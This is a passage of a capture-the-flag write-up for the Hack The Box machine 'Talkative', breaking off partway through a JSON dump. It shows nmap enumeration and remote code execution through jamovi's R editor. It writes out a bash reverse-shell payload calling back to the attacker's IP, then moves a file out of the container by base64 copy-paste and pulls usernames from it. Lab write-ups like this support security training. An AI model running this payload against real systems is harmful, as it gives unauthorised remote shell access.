---
title: "HTB Writeup: Talkative [Hard]"
summary: "A hard rated box, with a lot of container hopping and breakouts."
tags: ["htb", "writeup", "hard"]
#externalUrl: ""
showSummary: true
date: 2023-01-19
draft: false
---


# Talkative
## Enumeration
### NMAP

```
┌──(kali㉿kali)-[~/htb/talkative]
└─$ sudo nmap -A -T4 -sC -sV 10.10.11.155 
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 20:06 CEST
Nmap scan report for 10.10.11.155
Host is up (0.025s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   filtered ssh
80/tcp   open     http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://talkative.htb
|_http-server-header: Apache/2.4.52 (Debian)
8080/tcp open     http    Tornado httpd 5.0
|_http-title: jamovi
|_http-server-header: TornadoServer/5.0
8081/tcp open     http    Tornado httpd 5.0
|_http-title: 404: Not Found
|_http-server-header: TornadoServer/5.0
8082/tcp open     http    Tornado httpd 5.0
|_http-title: 404: Not Found
|_http-server-header: TornadoServer/5.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=6/22%OT=80%CT=1%CU=35257%PV=Y%DS=2%DC=T%G=Y%TM=62B35A2
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11
OS:NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=3F%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=3F%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=Y%DF=Y%T=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=3F%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Network Distance: 2 hops
Service Info: Host: 172.17.0.12

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   24.13 ms 10.10.14.1
2   31.59 ms 10.10.11.155

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.45 seconds
```


```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV -p- 10.10.11.155                                                                                                         130 ⨯
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-24 16:16 CEST
Nmap scan report for talkative.htb (10.10.11.155)
Host is up (0.023s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   filtered ssh
80/tcp   open     http    Apache httpd 2.4.52
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.52 (Debian)
3000/tcp open     ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Instance-ID: vfHL8BxBEbKMqvyg6
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Fri, 24 Jun 2022 12:14:06 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|     <meta name="distribution" content="global" />
|     <meta name="rating" content="general" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta name="apple-mobile-web-app-capable" conten
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Instance-ID: vfHL8BxBEbKMqvyg6
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Fri, 24 Jun 2022 12:14:07 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|     <meta name="distribution" content="global" />
|     <meta name="rating" content="general" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta name="apple-mobile-web-app-capable" conten
|   Help, NCP: 
|_    HTTP/1.1 400 Bad Request
8080/tcp open     http    Tornado httpd 5.0
|_http-title: jamovi
|_http-server-header: TornadoServer/5.0
8081/tcp open     http    Tornado httpd 5.0
|_http-title: 404: Not Found
|_http-server-header: TornadoServer/5.0
8082/tcp open     http    Tornado httpd 5.0
|_http-title: 404: Not Found
|_http-server-header: TornadoServer/5.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.92%I=7%D=6/24%Time=62B5C744%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,31BA,"HTTP/1\.1\x20200\x20OK\r\nX-XSS-Protection:\x201\r\nX-In
SF:stance-ID:\x20vfHL8BxBEbKMqvyg6\r\nContent-Type:\x20text/html;\x20chars
SF:et=utf-8\r\nVary:\x20Accept-Encoding\r\nDate:\x20Fri,\x2024\x20Jun\x202
SF:022\x2012:14:06\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html
SF:>\n<html>\n<head>\n\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/c
SF:ss\"\x20class=\"__meteor-css__\"\x20href=\"/3ab95015403368c507c78b4228d
SF:38a494ef33a08\.css\?meteor_css_resource=true\">\n<meta\x20charset=\"utf
SF:-8\"\x20/>\n\t<meta\x20http-equiv=\"content-type\"\x20content=\"text/ht
SF:ml;\x20charset=utf-8\"\x20/>\n\t<meta\x20http-equiv=\"expires\"\x20cont
SF:ent=\"-1\"\x20/>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=
SF:\"IE=edge\"\x20/>\n\t<meta\x20name=\"fragment\"\x20content=\"!\"\x20/>\
SF:n\t<meta\x20name=\"distribution\"\x20content=\"global\"\x20/>\n\t<meta\
SF:x20name=\"rating\"\x20content=\"general\"\x20/>\n\t<meta\x20name=\"view
SF:port\"\x20content=\"width=device-width,\x20initial-scale=1,\x20maximum-
SF:scale=1,\x20user-scalable=no\"\x20/>\n\t<meta\x20name=\"mobile-web-app-
SF:capable\"\x20content=\"yes\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-
SF:app-capable\"\x20conten")%r(Help,1C,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\n\r\n")%r(NCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(HTT
SF:POptions,13E4,"HTTP/1\.1\x20200\x20OK\r\nX-XSS-Protection:\x201\r\nX-In
SF:stance-ID:\x20vfHL8BxBEbKMqvyg6\r\nContent-Type:\x20text/html;\x20chars
SF:et=utf-8\r\nVary:\x20Accept-Encoding\r\nDate:\x20Fri,\x2024\x20Jun\x202
SF:022\x2012:14:07\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html
SF:>\n<html>\n<head>\n\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/c
SF:ss\"\x20class=\"__meteor-css__\"\x20href=\"/3ab95015403368c507c78b4228d
SF:38a494ef33a08\.css\?meteor_css_resource=true\">\n<meta\x20charset=\"utf
SF:-8\"\x20/>\n\t<meta\x20http-equiv=\"content-type\"\x20content=\"text/ht
SF:ml;\x20charset=utf-8\"\x20/>\n\t<meta\x20http-equiv=\"expires\"\x20cont
SF:ent=\"-1\"\x20/>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=
SF:\"IE=edge\"\x20/>\n\t<meta\x20name=\"fragment\"\x20content=\"!\"\x20/>\
SF:n\t<meta\x20name=\"distribution\"\x20content=\"global\"\x20/>\n\t<meta\
SF:x20name=\"rating\"\x20content=\"general\"\x20/>\n\t<meta\x20name=\"view
SF:port\"\x20content=\"width=device-width,\x20initial-scale=1,\x20maximum-
SF:scale=1,\x20user-scalable=no\"\x20/>\n\t<meta\x20name=\"mobile-web-app-
SF:capable\"\x20content=\"yes\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-
SF:app-capable\"\x20conten");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=6/24%OT=80%CT=1%CU=39988%PV=Y%DS=2%DC=T%G=Y%TM=62B5C75
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=3F%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=3F%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=Y%DF=Y%T=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=3F%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D
OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4
OS:0%CD=S)

Network Distance: 2 hops
Service Info: Host: 172.17.0.8

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   32.12 ms 10.10.14.1
2   26.05 ms talkative.htb (10.10.11.155)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.33 seconds

```
#### SSH Service Port
The SSH port is filtered and unresponsive. This may indicate that access to the SSH service is restricted.

```
┌──(kali㉿kali)-[~]
└─$ ssh yeeb@talkative.htb -vvv                                                                                                                       130 ⨯
OpenSSH_9.0p1 Debian-1, OpenSSL 1.1.1o  3 May 2022
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
debug1: /etc/ssh/ssh_config line 21: Applying options for *
debug3: expanded UserKnownHostsFile '~/.ssh/known_hosts' -> '/home/kali/.ssh/known_hosts'
debug3: expanded UserKnownHostsFile '~/.ssh/known_hosts2' -> '/home/kali/.ssh/known_hosts2'
debug2: resolving "talkative.htb" port 22
debug3: resolve_host: lookup talkative.htb:22
debug3: ssh_connect_direct: entering
debug1: Connecting to talkative.htb [10.10.11.155] port 22.
debug3: set_sock_tos: set socket 3 IP_TOS 0x10

```
#### HTTP Service Port 80

```
┌──(kali㉿kali)-[~/htb/talkative]
└─$ wappy -u http://talkative.htb:80

[+] TECHNOLOGIES [TALKATIVE.HTB:80] :

Programming languages : PHP [version: 7.4.28]
Operating systems : Debian [version: nil]
CMS : Bolt [version: nil]
Font scripts : Google Font API [version: nil]
CDN : jsDelivr [version: nil]
JavaScript frameworks : Alpine.js [version: nil]
Web servers : Apache [version: 2.4.52]
```
http://talkative.htb/person/ contains some user information

| Name  |  Email |  Job Level |
|---|---|---|
| Janit Smith  | janit@talkative.htb  |  Chief Financial Officer |
| Saul Goodman  | saul@talkative.htb  | Chief Executing Officer  |
| Matt Williams   |  matt@talkative.htb |  Chief Marketing Officer & Head of Design |
|   |  support@talkative.htb |  |


#### HTTP Service Port 8080
```
┌──(kali㉿kali)-[~/htb/talkative]
└─$ wappy -u http://talkative.htb:8080

[+] TECHNOLOGIES [TALKATIVE.HTB:8080] :

Web servers : TornadoServer [version: 5.0]
```
The titlebar indicates that the service running is ```jamovi```. By clicking on the three dots in the upper right corner we can confirm the version is: ```Version 0.9.5.5```
I've found a exploit to try later:
```Exploit for Cross-site Scripting in Jamovi CVE-2021-28079``` https://sploitus.com/exploit?id=F45F77BE-1B49-5574-A908-64EF4C774BD7

#### HTTP Service Port 3000
```
┌──(kali㉿kali)-[~/htb/talkative]
└─$ wappy -u http://talkative.htb:3000

[+] TECHNOLOGIES [TALKATIVE.HTB:3000] :

Databases : MongoDB [version: nil]
JavaScript frameworks : Meteor [version: nil]
Programming languages : Node.js [version: nil]
```
This service seems to be running rocket.chat


## Foothold

The exploit for ```Jamovi CVE-2021-28079``` did not work for me because i was not able to download a ```.omv ```file to manipulate, the software seemed to only save them ```locally```. 

However after some googleing i've found a way to ```execute system commands``` with the ```R```language within the ```Rj Editor```, I've used this documentation:
https://astrostatistics.psu.edu/su07/R/html/base/html/system.html

And this blog post:
https://www.r-bloggers.com/2021/09/how-to-use-system-commands-in-your-r-script-or-package/

The skeletion payload looked like this:
```system2("<COMMAND>", stdout = TRUE, stderr = TRUE)```

Confirmed RCE with 
```system2("id", stdout = TRUE, stderr = TRUE)```

Created a revershell payload at https://www.revshells.com/ but it did not immeditaly work.
The final payload for the reverse shell looked like this, i had to switch to a different function:
```system("bash -c 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1'",intern=TRUE)```

We are greeted with a docker container running as root:
```
┌──(kali㉿kali)-[~/htb/talkative]
└─$ rlwrap nc -lvnp 4444                                                                                                                              130 ⨯
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.155.
Ncat: Connection from 10.10.11.155:53172.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
ls -la
ls -la
total 84
drwxr-xr-x   1 root root 4096 Mar  7 23:18 .
drwxr-xr-x   1 root root 4096 Mar  7 23:18 ..
-rwxr-xr-x   1 root root    0 Aug 15  2021 .dockerenv
drwxr-xr-x   2 root root 4096 Jul 22  2021 bin
drwxr-xr-x   2 root root 4096 Apr 12  2016 boot
drwxr-xr-x   5 root root  340 Jun 22 16:02 dev
drwxr-xr-x   1 root root 4096 Aug 15  2021 etc
drwxr-xr-x   2 root root 4096 Apr 12  2016 home
drwxr-xr-x   1 root root 4096 Aug 15  2021 lib
drwxr-xr-x   2 root root 4096 Jul 22  2021 lib64
drwxr-xr-x   2 root root 4096 Jul 22  2021 media
drwxr-xr-x   2 root root 4096 Jul 22  2021 mnt
drwxr-xr-x   2 root root 4096 Jul 22  2021 opt
dr-xr-xr-x 408 root root    0 Jun 22 16:02 proc
drwx------   1 root root 4096 Mar  7 23:19 root
drwxr-xr-x   1 root root 4096 Aug 15  2021 run
drwxr-xr-x   1 root root 4096 Aug 15  2021 sbin
drwxr-xr-x   2 root root 4096 Jul 22  2021 srv
dr-xr-xr-x  13 root root    0 Jun 22 16:02 sys
drwxrwxrwt   1 root root 4096 Jun 22 17:07 tmp
drwxr-xr-x   1 root root 4096 Jul 22  2021 usr
drwxr-xr-x   1 root root 4096 Jul 22  2021 var
root@b06821bbda78:/# 
```
No flag.txt in ```/root``` but a ```bolt-administration.omv``` file which feeled kinda suspicous.

### Interesting .omv file

I've even found my ```malicous.omv``` file frome earlier where i tried to generate and download a ```.omv``` file to ```manipulate``` it.

```
drwxrwxrwx 1 root root 4096 Jun 22 17:06 .
drwx------ 1 root root 4096 Mar  7 23:19 ..
-rw-r--r-- 1 root root 1251 Jun 22 17:06 malicous.omv
ls -la
ls -la
total 32
drwx------ 1 root root 4096 Mar  7 23:19 .
drwxr-xr-x 1 root root 4096 Mar  7 23:18 ..
lrwxrwxrwx 1 root root    9 Mar  7 23:19 .bash_history -> /dev/null
-rw-r--r-- 1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x 3 root root 4096 Jun 22 17:07 .jamovi
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwxrwxrwx 1 root root 4096 Jun 22 17:06 Documents
-rw-r--r-- 1 root root 2192 Aug 15  2021 bolt-administration.omv
```

```nc``` was not availabe in the ```Docker Container``` so I simply ```base64 encoded``` the file and transfered it to my machine via ```copy and paste``` into ```base64 -d``` and compared the file hashes for integrity with ```md5sum```.

Encode:
```
cat bolt-administration.omv | base64 
UEsDBBQAAAAIAAu6DlMlbXE6RwAAAGoAAAAUAAAATUVUQS1JTkYvTUFOSUZFU1QuTUbzTczLTEst
LtENSy0qzszPs1Iw1DPgckksSdR1LErOyCxLRZHRM+LKSszNL8vEIgvS6FyUmliSmqLrVGmlAFGo
YATUBYRcAFBLAwQUAAAACAALug5TJW1xOkcAAABqAAAABAAAAG1ldGHzTczLTEstLtENSy0qzszP
s1Iw1DPgckksSdR1LErOyCxLRZHRM+LKSszNL8vEIgvS6FyUmliSmqLrVGmlAFGoYATUBYRcAFBL
AwQUAAAACAALug5TwzMjYjMDAADJCQAACgAAAGluZGV4Lmh0bWzNVm1v2zYQ/p5fcVVRIAWsF8tO
uiiygSAJsALdWjhpgaEoClo6SUwoUiNpO96Q/15KcmLJNtNin0bAsOi757k7Pryz4ldXHy9v//p0
DYUu2fQobr/ArLhAkraPzbZETSApiFSoJ85CZ+5vDvhbh62npprhdIZqwbSK/Xa7NSu9rvfND3OR
ruHfZ1smuHYzUlK2jsC5wVwgfH7vDGZiLrQY/I5siZomZHAhKWEDRbhyFUqaDZ6d4boUd9Tp/HCz
LueCOXD+HCYRTMgIXo+a1TUspKotKWbEJN+xlETmlEcQjquH836+iv6DEQzD6mHj/9jWVgx3K9t4
ngZvDiVzfXp1cbYX0jWVa1H2AtRrVVCNrqpIYii5WElS7YQPLeFHvfAvRzmY3FOA0QCKsfmcWAIN
fzHQhk+TOcMO1VzIFGVTIuV5BEGHrCI5unOJ5N6lXNHUhCNLQdMDhFqCTgedTdGJ8TLPTyX2/mYu
YTTnboJco+wwa3zQrS2C1mhBSpoX2gJsbBbc3UJpmq0tyI11D0t5apJxh70zSFNzwC7DTEcwwtIG
Cq2gUztoZAWd2UFjK2gY2lEndtTJLooL3b1rT+19YhQOnjr8cTuz/M3Qiv12Ksb14Gpn2rPT7orN
AEjM7anFT2lz/yaOA6pCxpICk/uJkxGm0NmOymI4tdAdWTdNqAqaBCdO5w7UpZ9vziGqi3KmsV9N
DzPZ+beHYLKbYYYSeYIHku1tDmakNJHblMImpb1a9oszE4A/sTXtuMK6L6J3QWAIvg6/GXmMyz6V
FTlukLcFwh0pxZJCJcUdJhqOwyAcvvUgxnLammLfPHpw/AWlooJD6AVv4eulKKtF3fA3ItMrIvGb
BzPUkuISU8ikKCEmUEjMJk6hdaUi31+tVl7L6QmZO2Yiybz+K/0+Z4TfO9PDfrFPpt6hAnta/i+E
CP+rEDO4FBLhFknZU2AWwQV8IDxfmDENhKeAfEml4KXpKTOZpaEkmqr6lYCZXqs1MQXtSjbuS6Z+
XbJEEu5Jd3M7XpZt37eRDo5nZhgl96YCBbIf74/ZxZ+gOKlUITTUhbvB2A1M+T8XPPbbEWT6sH5l
+wFQSwMEFAAAAAgAC7oOU4GSQIEOAQAAHwQAAA0AAABtZXRhZGF0YS5qc29uzZA9T8MwEIb/SuS5
Q9oikNigLJWgA1QsqMOpvqaW/BHZ5wYU5b/jC3HSDRakbLnn3tivn1ZIIHhDEvdFK7xrNi5aHm4W
hTg6HY3NZJ2IR+MuKF9dExL5OCQEUk6gFYHAc7pMK7SS/+s4dlKo5ZCxYDB9iQeRFoozy/G2/Vfd
755SLV5zvcz2+EnMDEKIHjPeOaMsaN6cnDdRA9Or8QVDgAozrcGjpa0cWjZK0pk7rG7TRMOhyhJW
6PuGpnaedkPpvhSGo1c1KWczIg828H357VLRL0qMCkHZ6h10xFEneWWe8YKaCfmI3aKYjD2OxlZz
MLa8m72xzWhs/Sdj2+kV/yStLGcp7XB9+k+u674BUEsDBBQAAAAIAAu6DlORSd4crwAAALEBAAAK
AAAAeGRhdGEuanNvbqtWclSyUqhWyklMSs0pBjKjow10FJRCi1OL8hJzU5VQ2WmJOcWpsToK0YZA
8dzEkhKHksSc7MSSzLJUvYySJCVconB9RkAVWYl5mVg0YheG6zQGKilOLM3B1IhVFKIvthYo74TN
gwGJxcXl+UUpSqhsFA9mpfobWJamZYS72BQrYfJRPJUUZWGZURtmExzv4qiEyUfxhmZwYLh7rp2l
t4crWC0aH8npzmhOj62tBQBQSwMEFAAAAAgAC7oOU0I0Wx0WAAAAMAAAAAgAAABkYXRhLmJpbmNg
YGBgBGImIGZmgABmKJ8Rwm1AxgBQSwMEFAAAAAgAC7oOUzyM1sYuAAAAMgAAABEAAAAwMSBlbXB0
eS9hbmFseXNpcxNglGJNzS0oqVRizsotM2ISYLTiFWIPSi0uzSkplmB2YnBgrmCcxAgTmcHICABQ
SwECFAMUAAAACAALug5TJW1xOkcAAABqAAAAFAAAAAAAAAAAAAAAgAEAAAAATUVUQS1JTkYvTUFO
SUZFU1QuTUZQSwECFAMUAAAACAALug5TJW1xOkcAAABqAAAABAAAAAAAAAAAAAAAgAF5AAAAbWV0
YVBLAQIUAxQAAAAIAAu6DlPDMyNiMwMAAMkJAAAKAAAAAAAAAAAAAACAAeIAAABpbmRleC5odG1s
UEsBAhQDFAAAAAgAC7oOU4GSQIEOAQAAHwQAAA0AAAAAAAAAAAAAAIABPQQAAG1ldGFkYXRhLmpz
b25QSwECFAMUAAAACAALug5TkUneHK8AAACxAQAACgAAAAAAAAAAAAAAgAF2BQAAeGRhdGEuanNv
blBLAQIUAxQAAAAIAAu6DlNCNFsdFgAAADAAAAAIAAAAAAAAAAAAAACAgU0GAABkYXRhLmJpblBL
AQIUAxQAAAAIAAu6DlM8jNbGLgAAADIAAAARAAAAAAAAAAAAAACAAYkGAAAwMSBlbXB0eS9hbmFs
eXNpc1BLBQYAAAAABwAHAJQBAADmBgAAAAA=
md5sum bolt-administration.omv
89a471297760280c51d7a48246f95628  bolt-administration.omv
root@b06821bbda78:~# 
```
Decode:
```
┌──(kali㉿kali)-[~/htb/talkative/loot]
└─$ echo "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
eXNpc1BLBQYAAAAABwAHAJQBAADmBgAAAAA=" | base64 -d > bolt-administration.omv 
                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/talkative/loot]
└─$ md5sum bolt-administration.omv 
89a471297760280c51d7a48246f95628  bolt-administration.omv
```

I've ```unzipped``` the ```.omv``` file and found ```credentials``` in the ```xdata.json``` file:

```
┌──(kali㉿kali)-[~/htb/talkative/loot]
└─$ cat xdata.json | jq
{
  "A": {
    "labels": [
      [
        0,
        "Username",
        "Username",
        false
      ],
      [
        1,
        "matt@talkative.htb",
        "matt@talkative.htb",
        false
      ],
      [
        2,
        "janit@talkative.htb",
        "janit@talkative.htb",
        false
      ],
      [
        3,
        "saul@talkative.htb",
        "saul@talkative.htb",
        false
      ]
    ]
  },
  "B": {
